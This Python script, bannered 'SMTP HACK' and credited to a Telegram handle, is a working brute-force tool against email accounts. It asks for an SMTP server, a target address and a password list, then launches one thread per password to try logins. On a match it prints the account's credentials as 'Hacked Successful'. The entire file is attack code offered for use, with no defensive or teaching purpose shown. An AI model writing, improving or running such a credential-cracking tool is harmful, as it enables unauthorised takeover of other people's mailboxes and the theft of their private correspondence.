import sys,os
try:
    import smtplib
except:
    os.system('pip install smtplib')
    os.system('cls || clear')
    try:
        import smtplib
    except:
        print('ERROR: Plesae install `smtplib` library!')
        sys.exit()
try:
    from threading import Thread
except:
    os.system('pip install threading')
    os.system('cls || clear')
    try:
        from threading import Thread
    except:
        print('ERROR: Plesae install `threading` library!')
        sys.exit()
try:
    from rich import print as pr
except:
    os.system('pip install rich')
    os.system('cls || clear')
    try:
        from rich import print as pr
    except:
        print('ERROR: Plesae install `rich` library!')
        sys.exit()



pr("""
[bold green]    


+----------------------------------------------------+
| ____  __  __ _____ ____    _   _    _    ____ _  __|
|/ ___||  \/  |_   _|  _ \  | | | |  / \  / ___| |/ /|
|\___ \| |\/| | | | | |_) | | |_| | / _ \| |   | ' / |
| ___) | |  | | | | |  __/  |  _  |/ ___ \ |___| . \ |
||____/|_|  |_| |_| |_|     |_| |_/_/   \_\____|_|\_\|
+----------------------------------------------------+
[/bold green] 

[bold yellow] Coded By NICOLA (Telegram : @black_nicola) [/bold yellow]
      
      
      
""")

pr('[bold yellow] Enter SMTP Server (Gmail=smtp.gmail.com) : [/bold yellow]',end="")
smtp_server = str(input())
pr('[bold yellow] Enter SMTP PORT Server (Gmail=587) : [/bold yellow]',end="")
smtp_port = int(input(""))

pr('[bold yellow] Enter Email Target : [/bold yellow]',end="")
email = str(input(""))
pr('[bold yellow] Enter Password List : [/bold yellow]',end="")
password_list = str(input(""))


def Test_SMTP(password):
    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        try:
            server.login(email, password)
            pr(f"""
[bold green]
    !!!! SMTP Email Hacked Successful !!!!
                  
     SMTP SERVER :  {smtp_server}
     SMTP PORT   :  {smtp_port}

     EMAIL       :  {email}
     PASSWORD    :  {password}
[/bold green]
""")
            sys.exit()
        except:
            pr(f" [bold blue]   [ TEST BAD ] [/bold blue][bold yellow]The password   {password}   did not match! [/bold yellow]")
        try:
            server.quit()
        except:
            pass
    except:
        pr("   [bold red] [ ERROR ][/bold red] [bold yellow]SMTP Server Coonection Error![/bold yellow]")

    

for passw in open(password_list):
    Thread(target=Test_SMTP,args=(passw.replace("\n",""),)).start()
